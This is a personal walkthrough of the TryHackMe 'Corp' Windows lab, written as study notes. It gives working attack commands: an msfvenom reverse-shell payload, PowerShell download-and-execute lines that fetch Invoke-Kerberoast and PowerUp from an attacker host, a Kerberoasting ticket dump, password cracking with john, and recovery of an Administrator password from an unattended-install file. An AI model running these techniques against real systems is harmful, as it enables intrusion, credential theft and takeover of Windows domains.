---
title: "Corp"
---

:::info Description

These are my notes for the [Corp Room](https://tryhackme.com/room/corp) on TryHackMe.

Note: Task #1 is to deploy the machine.

|OS|Level|Rating
|:---:|:-----:|:-----:|
|Windows|Easy|5/5|

:::

## TASK2: BYPASS APPLOCK

I RDP to the machine with login details provided. On the machine I can't execute anything with AppLocker tripping and stopping me.

### shell.exe

I want to generate a malicious shell and download to an 'allow-listed' directory e.g. `C:\Windows\System32\spool\drivers\color`.

Generate: `msfvenom -p windows/shell_reverse_tcp LHOST=10.11.55.83 LPORT=80 -e x86/shikata_ga_nai -f exe -o shell.exe`

Serve it from my attack machine: `sudo python3 -m http.server 80`

Try pull it down from my RDP session: `certutil.exe -urlcache -f http://10.11.55.83/shell.exe shell.exe` WRONG.

Try again with PowerShell: `Invoke-WebRequest -Uri "http://10.11.55.83/shell.exe" -OutFile ".\shell.exe"` CORRECT.

download to directory: `C:\Windows\System32\spool\drivers\color` successful, but running the exe kept tripping AV. need to look into obfuscating binary in some way.

## TASK3: KERBEROASTING

Follow instructions on how to complete this task.

### enumerate windows

Looking for existing Service Principals (spn):

```powershell
PS C:\Users\dark> setspn.exe -T medin -Q */*
Ldap Error(0x51 -- Server Down): ldap_connect
Failed to retrieve DN for domain "medin" : 0x00000051
Warning: No valid targets specified, reverting to current domain.
CN=OMEGA,OU=Domain Controllers,DC=corp,DC=local
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local
        ldap/omega.corp.local/ForestDnsZones.corp.local
        ldap/omega.corp.local/DomainDnsZones.corp.local
        TERMSRV/OMEGA
        TERMSRV/omega.corp.local
        DNS/omega.corp.local
        GC/omega.corp.local/corp.local
        RestrictedKrbHost/omega.corp.local
        RestrictedKrbHost/OMEGA
        RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        HOST/OMEGA/CORP
        HOST/omega.corp.local/CORP
        HOST/OMEGA
        HOST/omega.corp.local
        HOST/omega.corp.local/corp.local
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/7c4e4bec-1a37-4379-955f-a0475cd78a5d/corp.local
        ldap/OMEGA/CORP
        ldap/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        ldap/omega.corp.local/CORP
        ldap/OMEGA
        ldap/omega.corp.local
        ldap/omega.corp.local/corp.local
CN=krbtgt,CN=Users,DC=corp,DC=local
        kadmin/changepw
CN=fela,CN=Users,DC=corp,DC=local
        HTTP/fela
        HOST/fela@corp.local
        HTTP/fela@corp.local

Existing SPN found!
```

### get kerberoast.ps1

no external network, served the kerberoast ps1 from my local webserver:

```powershell
PS C:\Users\dark> iex(New-Object Net.WebClient).DownloadString('http://10.11.55.83/Invoke-Kerberoast.ps1')
PS C:\Users\dark> Invoke-Kerberoast -OutputFormat hashcat|fl


TicketByteHexStream  :
Hash                 : $krb5tgs$23$*fela$corp.local$HTTP/fela*$1F4596FE1600B29B2C9C9372905C3DAA$55AD748236930A037C
                       D75C0720E2B5416A7A48FD40189B621C110C19DC51AA947718EFE907583823B8FF220F32E1277F3FEB01DE738E8
                       5DC1F15ACEDAAC6C0B30C66936464C1F0B20388F539EDCDA68FE4A588383BC8A4E139C491EE5B5ACF4481954D86
                       86DDF9C4E685628AAFAA95BCFE5E3FE2E8C1CCECE32071EBB07997C0B5C6B8814EBF973C9486680FA944F98F6A2
                       46D50205A9BB026D43CC326D053346767F54DC4FF4F822548F0FF0BA58D58A3BA14ABF05A004B4E50D42F68664A
                       E4EAC6660FADAA4B87A61A227CC956CBCF6E7FEA4AFFFFD6374AC20614177BF09C54F2EEE0CA2615FA4FA941430
                       1D251AB5616774D07FEF1E3F4337D9AB58A33861A7B95120E0BDD537D5CA2E1427CB4075FDE81AAC3FF502AA8C1
                       9CB629C69211D19193A498F36DDD8EF1630A95E22E35B6A72E1482B5A4231F3A6B335A6F88954FBE5E3BD25287D
                       B91AF143BB91C6A5538776CAF5E339C8CB045E4927F7395D606FC90DFD60ABAF04FA39D42D684FC9E70A521CA50
                       272C43CA51E2C7C85C470BEA4509F4EAA84467F9878B96D1CA32550E635175C0E5129669F8F80264D451A83D9E8
                       6E6A1FBD6E5B0436C20D43B5187F80A626EEF84D0477AFBA4729F0342601CFCE3FA891229959D8EFF0A48ABB782
                       146105769CFEF0C19A60DB10943323D11BED7CFD65C56B2D2CB5CDC5D0B13580469F0664188427C86D5F758A53B
                       7041DD9678439695545A5A19497FDF82E02F51427D1E1AC2BD9AA23CF87F45925BE17707244D3920D7F144199D0
                       DCD58968D5B07FBE9753109AC735442A85111D1DC8246A86E68E5F18DBB18511C9842EB9CBD0E0E74380DA176BF
                       68A1235AD6FD99CAAB44184709339845D2FE3AA2A1ADC0A5FD27374DA33CF19A674AF740368A4862295414FF2A6
                       DAEE9B2E17E911374292A8D08A42A5D83DE63C7B9026C83BC8A47DAE2F46BAC78B86051565C8BF078ED8E73C8DB
                       CA22C382CF4633DD0C9573EF300CC836377FADB488936B2DD07922D544EE85FA50BA0514F72EE7288FC4A028035
                       ABD9E255D424B4B7A80DCCA27846C2EDE8957EA025F49A1D9367B9309D4516B30694C34E10EEC694795FE1D3BC3
                       E0D86332124ED33F9A3084F25B3BA2DD59AEB585FC94BE95A7AABF7165377EA92AEDF441E6C2D29E2F2501DFA0B
                       255AA76A3869D8262D0A6D7F3C6BDD17BC83AB5EC85D9DB71D58B00EC8F7F4E001C9C856F812ADD9ED42905A03B
                       17ED2ACB153D7B2D334C05BFBC68AFC0ECEFA97864F4B060D612B3FE436FA6B3DE682DF0E2788AAB4F57DF35D08
                       4CDB2290DB60B8F4C30717084A6125BC79538B128DF1F73603F40448F4934AF27D3711682B5516EB2902A86E639
                       45BC7FD6D75A10558E7A419AA006C1DCC9AB195E757F521513299C3B2
SamAccountName       : fela
DistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local
ServicePrincipalName : HTTP/fela
```

### crack hash

copied the hash to a text file `hash.txt` and then used `cat hash.txt | tr -d "[:space:]" > hash.file` to remove all whitespaces and join the hash up.

then used john (thanks tedd) to crack:

```bash
➜  CORP git:(main) ✗ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rubenF124        (?)
1g 0:00:00:07 DONE (2022-03-31 22:36) 0.1340g/s 554003p/s 554003c/s 554003C/s rubens02..ruben4484
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

show

```bash
➜  CORP git:(main) ✗ john --show hash.txt
?:rubenF124

1 password hash cracked, 0 left
```

## PRIVESC: user

RDP logged in as `fela` and got flag from desktop.

## PRIVESC: root

Web served the `PowerUp.ps1` script from my attack machine: `iex​(New-Object Net.WebClient).DownloadString('http://http://10.11.55.83/download/PowerUp.ps1')`

### PowerUp.ps1

Found a hash value:

```powershell
PS C:\Users\fela.CORP> iex(New-Object Net.WebClient).DownloadString('http://10.11.55.83/download/PowerUp.ps1')
PS C:\Users\fela.CORP> type C:\Windows\Panther\Unattend\Unattended.xml
<AutoLogon />
    <Password />
        <Value />dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
        <PlainText />false</PlainText>
    </Password>
    <Enabled />true</Enabled>
    <Username />Administrator</Username>
</AutoLogon>
```

```bash
dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=
certutil.exe -decode "C:\path\to\b64.txt" decode.txt`

$echo dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ= | base64 -d
tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
```

Use `tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T` admin password with `evil-winrm` login as Admin, grab flag from `C:\Users\Administrator\Desktop`
